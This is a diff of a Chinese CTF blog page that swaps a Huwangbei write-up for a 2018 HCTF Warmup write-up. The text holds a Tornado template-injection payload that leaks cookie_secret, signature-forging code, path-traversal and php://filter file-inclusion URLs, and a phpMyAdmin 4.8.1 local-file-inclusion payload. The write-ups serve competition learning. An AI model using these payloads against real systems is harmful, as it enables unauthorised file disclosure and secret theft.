@@ -108,37 +108,29 @@
 
 
 
-  <meta name="description" content="迟来的签到题描述是“easy xor???”，提示这题需要用异或。下载一个txt文件，打开后里面有一串字符： 1AAoHAR0nJ1YlUVQnU1BTVCVfUVZRUVUkUCBeUlVWIlBXUiNTXhs= 看到后面有“=”号，应该是base64加密。解密后得到异或密文。因为flag格式的最后一个字符为“}”，猜想将密文的最后一个字符与“}”异或就可得到密钥，再用这个密钥异或所有密文就可">
+  <meta name="description" content="只有做这种签到题才能维持得了生活。进入题目可看到：  点进去hint可看到：  这个url有个很明显的文件包含，推测是文件包含漏洞。然后试了一下下面两个常用的payload： 123http://warmup.2018.hctf.io/index.php?file=../../../../../../ffffllllaaaagggg.phphttp://warmup.2018.hctf.io/in">
 <meta name="keywords" content="CTF,writeup">
 <meta property="og:type" content="article">
-<meta property="og:title" content="“护网杯”部分题writeup">
-<meta property="og:url" content="http://yoursite.com/2018/10/15/huwangbei/index.html">
+<meta property="og:title" content="2018 HCTF Warmup writeup">
+<meta property="og:url" content="http://yoursite.com/2018/11/11/2018hctf/index.html">
 <meta property="og:site_name" content="L0ner的博客">
-<meta property="og:description" content="迟来的签到题描述是“easy xor???”，提示这题需要用异或。下载一个txt文件，打开后里面有一串字符： 1AAoHAR0nJ1YlUVQnU1BTVCVfUVZRUVUkUCBeUlVWIlBXUiNTXhs= 看到后面有“=”号，应该是base64加密。解密后得到异或密文。因为flag格式的最后一个字符为“}”，猜想将密文的最后一个字符与“}”异或就可得到密钥，再用这个密钥异或所有密文就可">
+<meta property="og:description" content="只有做这种签到题才能维持得了生活。进入题目可看到：  点进去hint可看到：  这个url有个很明显的文件包含，推测是文件包含漏洞。然后试了一下下面两个常用的payload： 123http://warmup.2018.hctf.io/index.php?file=../../../../../../ffffllllaaaagggg.phphttp://warmup.2018.hctf.io/in">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="https://ws1.sinaimg.cn/large/006tNbRwly1fw6vynhepwj30ji0f83z0.jpg">
-<meta property="og:image" content="https://ws2.sinaimg.cn/large/006tNbRwly1fw6w2ukuoqj307e04ijr6.jpg">
-<meta property="og:image" content="https://ws4.sinaimg.cn/large/006tNbRwly1fw6w36xq08j30ey04amx0.jpg">
-<meta property="og:image" content="https://ws4.sinaimg.cn/large/006tNbRwly1fw6w38vbymj306w03udfm.jpg">
-<meta property="og:image" content="https://ws2.sinaimg.cn/large/006tNbRwly1fw6w93kycdj30qu08cq36.jpg">
-<meta property="og:image" content="https://ws1.sinaimg.cn/large/006tNbRwly1fw6xcyd1prj30xq0f4my1.jpg">
-<meta property="og:image" content="https://ws4.sinaimg.cn/large/006tNbRwly1fw6xk17fb3j30mu05smx2.jpg">
-<meta property="og:image" content="https://ws1.sinaimg.cn/large/006tNbRwly1fw6xkb0wigj312a05gt8v.jpg">
-<meta property="og:image" content="https://ws4.sinaimg.cn/large/006tNbRwly1fw6wqcurl0j31c60ceq4a.jpg">
-<meta property="og:image" content="https://ws1.sinaimg.cn/large/006tNbRwly1fw6wudcktlj30oo0mgjsm.jpg">
-<meta property="og:image" content="https://ws1.sinaimg.cn/large/006tNbRwly1fw6xv3jjppj31gu048mxm.jpg">
-<meta property="og:updated_time" content="2018-10-15T08:51:27.035Z">
+<meta property="og:image" content="https://ws4.sinaimg.cn/large/006tNbRwly1fx4euyd67rj311s0vudj1.jpg">
+<meta property="og:image" content="https://ws3.sinaimg.cn/large/006tNbRwly1fx4exuo9t2j30ug082t8w.jpg">
+<meta property="og:image" content="https://ws4.sinaimg.cn/large/006tNbRwly1fx4f9ee9woj3118116wg4.jpg">
+<meta property="og:updated_time" content="2018-11-11T14:18:24.553Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="“护网杯”部分题writeup">
-<meta name="twitter:description" content="迟来的签到题描述是“easy xor???”，提示这题需要用异或。下载一个txt文件，打开后里面有一串字符： 1AAoHAR0nJ1YlUVQnU1BTVCVfUVZRUVUkUCBeUlVWIlBXUiNTXhs= 看到后面有“=”号，应该是base64加密。解密后得到异或密文。因为flag格式的最后一个字符为“}”，猜想将密文的最后一个字符与“}”异或就可得到密钥，再用这个密钥异或所有密文就可">
-<meta name="twitter:image" content="https://ws1.sinaimg.cn/large/006tNbRwly1fw6vynhepwj30ji0f83z0.jpg">
+<meta name="twitter:title" content="2018 HCTF Warmup writeup">
+<meta name="twitter:description" content="只有做这种签到题才能维持得了生活。进入题目可看到：  点进去hint可看到：  这个url有个很明显的文件包含，推测是文件包含漏洞。然后试了一下下面两个常用的payload： 123http://warmup.2018.hctf.io/index.php?file=../../../../../../ffffllllaaaagggg.phphttp://warmup.2018.hctf.io/in">
+<meta name="twitter:image" content="https://ws4.sinaimg.cn/large/006tNbRwly1fx4euyd67rj311s0vudj1.jpg">
 
 
 
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2018/10/15/huwangbei/"/>
+  <link rel="canonical" href="http://yoursite.com/2018/11/11/2018hctf/"/>
 
 
 
@@ -148,7 +140,7 @@
   };
 </script>
 
-  <title>“护网杯”部分题writeup | L0ner的博客</title>
+  <title>2018 HCTF Warmup writeup | L0ner的博客</title>
   
 
 
@@ -348,7 +340,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/15/huwangbei/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/11/2018hctf/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="L0ner">
@@ -365,7 +357,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">“护网杯”部分题writeup
+          <h1 class="post-title" itemprop="name headline">2018 HCTF Warmup writeup
               
             
           </h1>
@@ -390,9 +382,13 @@
                 
               
 
-              <time title="创建时间：2018-10-15 16:51:27" itemprop="dateCreated datePublished" datetime="2018-10-15T16:51:27+08:00">2018-10-15</time>
+              <time title="创建时间：2018-11-11 22:16:12 / 修改时间：22:18:24" itemprop="dateCreated datePublished" datetime="2018-11-11T22:16:12+08:00">2018-11-11</time>
             
 
+            
+              
+
+              
             
           </span>
 
@@ -418,7 +414,7 @@
                 
                   <span class="post-meta-item-text">本文字数：</span>
                 
-                <span title="本文字数">2k</span>
+                <span title="本文字数">536</span>
               
 
               
@@ -432,7 +428,7 @@
                 
                   <span class="post-meta-item-text">阅读时长 &asymp;</span>
                 
-                <span title="阅读时长">2 分钟</span>
+                <span title="阅读时长">1 分钟</span>
               
             </div>
           
@@ -452,47 +448,16 @@
       
 
       
-        <h1 id="迟来的签到题"><a href="#迟来的签到题" class="headerlink" title="迟来的签到题"></a>迟来的签到题</h1><p>描述是“easy xor???”，提示这题需要用异或。<br>下载一个txt文件，打开后里面有一串字符：</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AAoHAR0nJ1YlUVQnU1BTVCVfUVZRUVUkUCBeUlVWIlBXUiNTXhs=</span><br></pre></td></tr></table></figure>
-<p>看到后面有“=”号，应该是base64加密。解密后得到异或密文。<br>因为flag格式的最后一个字符为“}”，猜想将密文的最后一个字符与“}”异或就可得到密钥，再用这个密钥异或所有密文就可得到flag。脚本如下：</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">str = <span class="string">"AAoHAR0nJ1YlUVQnU1BTVCVfUVZRUVUkUCBeUlVWIlBXUiNTXhs="</span></span><br><span class="line">s = base64.b64decode(str)</span><br><span class="line">print(s)</span><br><span class="line">print(hex((s[-1])^ord('&#125;')))	#0x66</span><br><span class="line">print(chr((s[-1])^ord('&#125;')))	#f</span><br><span class="line">res = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    res += chr(i^<span class="number">0x66</span>)</span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure>
-<p>得到flag{AA0C72A5652C970773B6F8430D614E58}</p>
-<h1 id="easy-tornado"><a href="#easy-tornado" class="headerlink" title="easy_tornado"></a>easy_tornado</h1><p>进去是这样的：</p>
-<p><img src="https://ws1.sinaimg.cn/large/006tNbRwly1fw6vynhepwj30ji0f83z0.jpg" alt=""><br>点开分别看到如下：</p>
-<p><img src="https://ws2.sinaimg.cn/large/006tNbRwly1fw6w2ukuoqj307e04ijr6.jpg" alt=""></p>
-<p><img src="https://ws4.sinaimg.cn/large/006tNbRwly1fw6w36xq08j30ey04amx0.jpg" alt=""></p>
-<p><img src="https://ws4.sinaimg.cn/large/006tNbRwly1fw6w38vbymj306w03udfm.jpg" alt=""></p>
-<p>第三个flag.txt可以看到有个文件目录，此时的url为：</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//49.4.95.5:31849/file?filename=flag.txt&amp;signature=bb6d71b58a9d8c4b0e32e99eee055029</span></span><br></pre></td></tr></table></figure>
-<p>试着包含这个目录看能不能读取flag出来。构造url为：</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//49.4.95.5:31849/file?filename=/fllllllllllag&amp;signature=bb6d71b58a9d8c4b0e32e99eee055029</span></span><br></pre></td></tr></table></figure>
-<p>结果出现这个：</p>
-<p><img src="https://ws2.sinaimg.cn/large/006tNbRwly1fw6w93kycdj30qu08cq36.jpg" alt=""></p>
-<p>说签名错误，意思是得求出正确的signature来。<br>再看hint.txt给的一个提示：</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">md5(cookie_secret + md5(filename))</span><br></pre></td></tr></table></figure>
-<p>可能这就是求签名的式子，先求求看。式子中需要用到cookie_secret和filename，filename已经知道是“/fllllllllllag”，那么接下来就需要求cookie_secret。</p>
-<p>我们查看一下tornado这个框架的文档。<br>可以得知tornado框架里的tornado.web组件里有RequestHandler和Application类。<br>找到cookie_secret相关的东西看看。</p>
-<p><img src="https://ws1.sinaimg.cn/large/006tNbRwly1fw6xcyd1prj30xq0f4my1.jpg" alt=""></p>
-<p>cookie_secret是self.application.settings的参数。</p>
-<p><img src="https://ws4.sinaimg.cn/large/006tNbRwly1fw6xk17fb3j30mu05smx2.jpg" alt=""></p>
-<p>RequestHandler.settings是self.application.settings 的别名。</p>
-<p><img src="https://ws1.sinaimg.cn/large/006tNbRwly1fw6xkb0wigj312a05gt8v.jpg" alt=""></p>
-<p>接下来就是来找找如何构造url:</p>
-<p><img src="https://ws4.sinaimg.cn/large/006tNbRwly1fw6wqcurl0j31c60ceq4a.jpg" alt=""></p>
-<p>模板可以用两个大括号来构造表达式。<br>再看看模板的一些用法:</p>
-<p><img src="https://ws1.sinaimg.cn/large/006tNbRwly1fw6wudcktlj30oo0mgjsm.jpg" alt=""></p>
-<p>handler是RequestHandler的对象。<br>于是我们可以构造表达式:</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;handler.settings&#125;&#125;</span><br></pre></td></tr></table></figure>
-<p>构造url：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//49.4.95.5:31849/error?msg=&#123;&#123;handler.settings&#125;&#125;</span></span><br></pre></td></tr></table></figure></p>
-<p><img src="https://ws1.sinaimg.cn/large/006tNbRwly1fw6xv3jjppj31gu048mxm.jpg" alt=""></p>
-<p>就可以得到我们的cookie_secret为：</p>
-<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">I&#123;k57.yLAO6?sScNFro$~l!2xX-_0n&amp;Md@j)%(GZfqYK*JDWCtv4P8mpub1#zEU^</span><br></pre></td></tr></table></figure>
-<p>现在可以把得到的cookie_secret代入式子求签名了。脚本如下：</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">cookie = <span class="string">"I&#123;k57.yLAO6?sScNFro$~l!2xX-_0n&amp;Md@j)%(GZfqYK*JDWCtv4P8mpub1#zEU^"</span></span><br><span class="line">filename = <span class="string">"/fllllllllllag"</span></span><br><span class="line"></span><br><span class="line">#md5 (cookie_ secret + md5 (filename))</span><br><span class="line"></span><br><span class="line">temp = hashlib.md5(filename.encode()).hexdigest()</span><br><span class="line">sum = cookie + temp</span><br><span class="line">sign = hashlib.md5(sum.encode()).hexdigest()</span><br><span class="line">print(sign)</span><br></pre></td></tr></table></figure>
-<p>得到签名为b9a067e37b3d90410b4761bd02c95b6e，构造url：</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//49.4.95.5:31849/file?filename=/fllllllllllag&amp;signature=297cf619ef0551768aac7fc0dca97838</span></span><br></pre></td></tr></table></figure>
-<p>可得到flag{0d2443ae8744ceffa67cf1513b293331} </p>
-
+        <p>只有做这种签到题才能维持得了生活。<br>进入<a href="http://warmup.2018.hctf.io/" target="_blank" rel="noopener">题目</a>可看到：</p>
+<p><img src="https://ws4.sinaimg.cn/large/006tNbRwly1fx4euyd67rj311s0vudj1.jpg" alt=""></p>
+<p>点进去hint可看到：</p>
+<p><img src="https://ws3.sinaimg.cn/large/006tNbRwly1fx4exuo9t2j30ug082t8w.jpg" alt=""></p>
+<p>这个url有个很明显的文件包含，推测是文件包含漏洞。然后试了一下下面两个常用的payload：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//warmup.2018.hctf.io/index.php?file=../../../../../../ffffllllaaaagggg.php</span></span><br><span class="line"></span><br><span class="line">http:<span class="comment">//warmup.2018.hctf.io/index.php?file=php://filter/read=convert.base64-encode/resource=index.php</span></span><br></pre></td></tr></table></figure>
+<p>。。。并没有出来什么东西。接着在看首页源代码的时候发现有个==source.php #03a9f4==的注释，我们进去看看：</p>
+<p><img src="https://ws4.sinaimg.cn/large/006tNbRwly1fx4f9ee9woj3118116wg4.jpg" alt=""></p>
+<p>又是艰难的代码审计过程。通过google发现这题是一个<a href="https://www.imuo.com/a/9d619fd76c6a0eca0904d02f06753307d46e2b1dbea245e67840082cc4b157ec" target="_blank" rel="noopener">PhpMyadmin4.81文件包含的CVE</a>，关于此漏洞的解析网上有很多，这里搬运一个：<a href="http://www.lmxspace.com/2018/06/23/phpmyadmin-4-8-1-%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">《phpmyadmin-4.8.1-复现分析》</a><br>直接贴payload吧：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//warmup.2018.hctf.io/index.php?file=source.php%253f/../../../../../../ffffllllaaaagggg</span></span><br></pre></td></tr></table></figure>
       
     </div>
 
@@ -525,8 +490,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2018/10/12/whoami/" rel="next" title="Hackergame 2018 我是谁writeip">
-                <i class="fa fa-chevron-left"></i> Hackergame 2018 我是谁writeip
+              <a href="/2018/10/15/huwangbei/" rel="next" title="“护网杯”部分题writeup">
+                <i class="fa fa-chevron-left"></i> “护网杯”部分题writeup
               </a>
             
           </div>
@@ -534,10 +499,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2018/11/11/2018hctf/" rel="prev" title="2018 HCTF Warmup writeup">
-                2018 HCTF Warmup writeup <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -586,17 +547,8 @@
       
 
       
-        <ul class="sidebar-nav motion-element">
-          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
-            文章目录
-          </li>
-          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
-            站点概览
-          </li>
-        </ul>
-      
 
-      <section class="site-overview-wrap sidebar-panel">
+      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -660,22 +612,6 @@
         </div>
       </section>
 
-      
-      <!--noindex-->
-        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
-          <div class="post-toc">
-
-            
-              
-            
-
-            
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#迟来的签到题"><span class="nav-number">1.</span> <span class="nav-text">迟来的签到题</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#easy-tornado"><span class="nav-number">2.</span> <span class="nav-text">easy_tornado</span></a></li></ol></div>
-            
-
-          </div>
-        </section>
-      <!--/noindex-->
       
 
       
